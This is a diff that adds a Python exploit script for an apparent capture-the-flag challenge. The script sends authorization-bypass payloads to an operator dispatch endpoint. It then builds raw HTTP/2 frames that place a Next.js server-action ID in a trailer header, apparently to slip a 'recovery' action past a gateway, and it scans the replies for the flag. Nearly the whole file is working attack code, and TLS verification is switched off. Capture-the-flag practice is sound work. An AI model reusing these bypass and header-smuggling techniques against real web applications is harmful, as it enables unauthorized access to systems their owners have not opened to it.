@@ -1,0 +1,236 @@
+#!/usr/bin/env python3
+"""
+Two-step approach: Use dispatch to authorize, then recovery action
+Based on the "service gateway authorization" requirement
+"""
+import socket
+import ssl
+import struct
+import time
+import base64
+import re
+import json
+import requests
+from urllib.parse import unquote
+from hpack import Encoder
+
+HOST = "funicular-gm2cxozn.alfactf.ru"
+PORT = 443
+ACTION_ID_FILE = "/tmp/funi.actionid"
+
+with open(ACTION_ID_FILE) as f:
+    ACTION_ID = f.read().strip()
+print(f"# Using action_id = {ACTION_ID}")
+
+# Disable SSL warnings for requests
+requests.packages.urllib3.disable_warnings()
+
+def test_dispatch_bypass():
+    """Test if we can make dispatch return success to authorize recovery"""
+    print("[+] Testing dispatch endpoint bypass approaches...")
+
+    # Try various approaches to make dispatch succeed
+    test_cases = [
+        # Maybe internal network addresses work
+        {"operation": "plc-sync", "packet": "127.0.0.1", "workOrder": "WO-17-04", "terminal": "OP-3"},
+        {"operation": "plc-sync", "packet": "localhost", "workOrder": "WO-17-04", "terminal": "OP-3"},
+        {"operation": "plc-sync", "packet": "plc-gateway", "workOrder": "WO-17-04", "terminal": "OP-3"},
+
+        # Try success simulation
+        {"operation": "plc-sync", "packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "terminal": "OP-3", "authorize": True},
+        {"operation": "plc-sync", "packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "terminal": "OP-3", "bypass": True},
+
+        # Try different operations
+        {"operation": "authorize", "packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "terminal": "OP-3"},
+        {"operation": "gateway", "packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "terminal": "OP-3"},
+
+        # Try internal communication format
+        {"operation": "plc-sync", "packet": "200", "workOrder": "WO-17-04", "terminal": "OP-3"},  # HTTP 200 simulation
+        {"operation": "plc-sync", "packet": "success", "workOrder": "WO-17-04", "terminal": "OP-3"},
+    ]
+
+    session = requests.Session()
+    session.verify = False
+
+    for i, payload in enumerate(test_cases, 1):
+        print(f"  [{i:2d}] Testing: {payload}")
+        try:
+            resp = session.post(
+                f"https://{HOST}/api/operator/dispatch",
+                json=payload,
+                headers={"Content-Type": "application/json"},
+                timeout=10
+            )
+
+            print(f"       Status: {resp.status_code}")
+            if resp.status_code != 502:
+                print(f"       Body: {resp.text}")
+                if resp.status_code == 200:
+                    # If dispatch succeeds, immediately try recovery
+                    print(f"       [!] DISPATCH SUCCESS! Trying recovery...")
+                    return test_recovery_after_dispatch_success(session)
+
+        except Exception as e:
+            print(f"       Error: {e}")
+
+    return False
+
+def send_recovery_action():
+    """Send recovery action via H2 trailers"""
+    sock = socket.socket()
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.set_alpn_protocols(["h2"])
+
+    raw = socket.create_connection((HOST, PORT), timeout=15)
+    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+
+    if sock.selected_alpn_protocol() != "h2":
+        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
+
+    # HTTP/2 preface
+    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
+    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")  # SETTINGS
+
+    # Consume settings ACK
+    try:
+        sock.settimeout(2)
+        sock.recv(65536)
+    except:
+        pass
+    sock.settimeout(15)
+
+    # Send recovery with minimal FormData
+    payload = '["$K1"]'
+    body_bytes = payload.encode()
+
+    enc = Encoder()
+    header_block = enc.encode([
+        (":method", "POST"),
+        (":scheme", "https"),
+        (":authority", HOST),
+        (":path", "/"),
+        ("accept", "text/x-component"),
+        ("content-type", "text/plain;charset=UTF-8"),
+        ("content-length", str(len(body_bytes))),
+        ("trailer", "next-action"),
+        ("user-agent", "recovery-test"),
+    ])
+
+    trailer_block = enc.encode([("next-action", ACTION_ID)])
+
+    sid = 1
+
+    # Send frames
+    raw_header = struct.pack(">I", len(header_block))[1:] + b"\x01\x04" + struct.pack(">I", sid) + header_block
+    sock.sendall(raw_header)
+
+    raw_data = struct.pack(">I", len(body_bytes))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body_bytes
+    sock.sendall(raw_data)
+
+    raw_trailer = struct.pack(">I", len(trailer_block))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer_block
+    sock.sendall(raw_trailer)
+
+    # Read response
+    frames = []
+    end_time = time.time() + 15
+    while time.time() < end_time:
+        try:
+            header = sock.recv(9)
+            if len(header) < 9:
+                break
+            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
+            frame_type = header[3]
+            flags = header[4]
+            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF
+
+            payload = b""
+            while len(payload) < length:
+                chunk = sock.recv(length - len(payload))
+                if not chunk:
+                    break
+                payload += chunk
+
+            frames.append((frame_type, flags, stream_id, payload))
+            if stream_id == sid and (flags & 1):
+                break
+        except:
+            break
+
+    sock.close()
+
+    # Parse response
+    body = b""
+    for frame_type, flags, stream_id, payload in frames:
+        if frame_type == 0:  # DATA
+            body += payload
+
+    return body
+
+def test_recovery_after_dispatch_success(session):
+    """Test recovery action after dispatch success"""
+    print(f"[+] Testing recovery action after dispatch authorization...")
+
+    try:
+        body = send_recovery_action()
+        body_str = body.decode('utf-8', errors='ignore')
+        print(f"[+] Recovery response: {body_str[:200]}...")
+
+        # Look for success indicators
+        if "recovery-offline" not in body_str:
+            print(f"[!] Recovery behavior changed after dispatch!")
+
+            # Look for flag in response
+            if "alfa{" in body_str:
+                flag_match = re.search(r'alfa\{[^}]+\}', body_str)
+                if flag_match:
+                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
+                    return True
+
+            # Look for row 1 with success
+            row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
+            if row1_match:
+                content = row1_match.group(1)
+                print(f"[+] Action result: {content}")
+                if '"ok":true' in content:
+                    print(f"[!] RECOVERY SUCCESS!")
+                    return True
+
+        return False
+
+    except Exception as e:
+        print(f"[-] Recovery test error: {e}")
+        return False
+
+def main():
+    print("=" * 60)
+    print("Two-step approach: Dispatch authorization + Recovery action")
+    print("=" * 60)
+
+    success = test_dispatch_bypass()
+
+    if not success:
+        print("\n[*] Dispatch bypass failed. Trying direct recovery anyway...")
+        try:
+            body = send_recovery_action()
+            body_str = body.decode('utf-8', errors='ignore')
+
+            if "alfa{" in body_str:
+                flag_match = re.search(r'alfa\{[^}]+\}', body_str)
+                if flag_match:
+                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
+                    return
+
+            print(f"[*] Direct recovery result: {body_str[:200]}...")
+
+        except Exception as e:
+            print(f"[-] Direct recovery failed: {e}")
+
+    print("\n" + "=" * 60)
+    print("Two-step approach completed.")
+    print("Next: Look for additional authorization mechanisms")
+    print("or explore alternative exploitation vectors.")
+
+if __name__ == "__main__":
+    main()
